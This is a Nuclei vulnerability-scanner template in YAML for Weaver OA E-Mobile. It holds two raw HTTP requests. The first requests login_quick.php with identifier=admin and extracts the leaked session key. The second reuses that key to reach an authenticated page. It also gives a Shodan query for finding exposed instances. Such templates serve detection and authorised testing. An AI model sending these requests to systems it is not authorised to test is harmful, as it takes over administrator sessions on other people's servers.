http:
- extractors:
  - group: 1
    internal: true
    name: timestamp
    regex:
    - \"sessionkey\":\"(.*?)\"
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_1 == 200 && contains(body_1,'{{timestamp}}')
    - "status_code_2 == 200 && contains(body_2,'<title>\u65B0\u5EFA')"
    type: dsl
  matchers-condition: and
  raw:
  - 'POST /E-mobile/App/System/Login/login_quick.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    identifier=admin

    '
  - 'GET /E-mobile/App/Init.php?m=all_Create&detailid=&fromid=&sessionkey={{timestamp}}
    HTTP/1.1

    Host: {{Hostname}}

    '
id: weaver-login-sessionkey
info:
  author: SleepingBag945
  description: login_quick.php in OA E-Mobile leaks session key.
  metadata:
    max-request: 2
    shodan-query: http.html:"E-Mobile"
  name: OA E-Mobile login_quick.php - Login SessionKey
  severity: high
  tags: weaver,e-mobile,oa
